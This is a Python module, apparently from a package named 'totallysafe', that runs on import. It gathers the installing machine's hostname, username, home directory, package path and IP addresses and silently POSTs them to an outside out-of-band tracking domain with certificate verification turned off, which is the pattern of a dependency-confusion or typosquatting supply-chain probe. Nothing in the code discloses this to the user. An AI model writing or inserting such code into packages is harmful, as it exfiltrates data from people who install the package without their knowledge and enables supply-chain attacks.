import os
import socket
import getpass
import json
import base64
import http.client
import ssl

# ========== Config ==========
TRACKER_DOMAIN = "dbwgovzrtoclyqrugbqevwku0y375o05s.oast.fun"
PACKAGE_NAME = "totallysafe"
PACKAGE_VERSION = "2.0.1"

# ========== Collect Info ==========
tracking_data = {
    "p": PACKAGE_NAME,
    "c": os.path.dirname(__file__),
    "hd": os.path.expanduser("~"),
    "hn": socket.gethostname(),
    "un": getpass.getuser(),
    "dns": socket.gethostbyname_ex(socket.gethostname())[2],
    "v": PACKAGE_VERSION
}

# ========== Prepare POST ==========
body = json.dumps({"msg": tracking_data})
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len(body))
}

# ========== Send HTTPS POST ==========
try:
    context = ssl._create_unverified_context()
    conn = http.client.HTTPSConnection(TRACKER_DOMAIN, 443, context=context)
    conn.request("POST", "/", body, headers)
    conn.close()
except Exception as e:
    pass  # Fail silently
